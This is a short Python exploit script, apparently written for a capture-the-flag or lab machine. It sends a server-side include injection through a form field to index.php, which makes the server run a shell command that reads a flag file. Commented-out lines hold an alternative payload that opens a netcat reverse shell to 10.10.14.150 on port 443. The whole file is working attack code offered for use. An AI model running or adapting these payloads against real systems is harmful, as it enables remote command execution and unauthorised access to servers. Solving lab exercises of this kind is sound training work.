#!/usr/bin/python3


import requests
import sys

from urllib.parse import quote
from pwn import *



# reverse_shell = "<!--#exec cmd='mkfifo /tmp/foo;nc 10.10.14.150 443 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo' -->"

# reverse_shell = """<!--#exec cmd="mkfifo /tmp/foo;nc 10.10.14.150 443 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->
# """


def run_exploit(url):
    name = "<!--#exec cmd='cat .htaccess.flag' -->"
    
    ress = requests.post(url=url+"index.php", data={
        "name":f"{name}",
        "form":"submit"
        })
    print(ress.status_code)
    print(ress.text)



def main():
    
    try:
        target_url = sys.argv[1]
        run_exploit(target_url)

    except Exception as e:
        print(str(e))
        exit(1)

    except KeyboardInterrupt:
        exit(0)



if __name__ == "__main__":
    main()
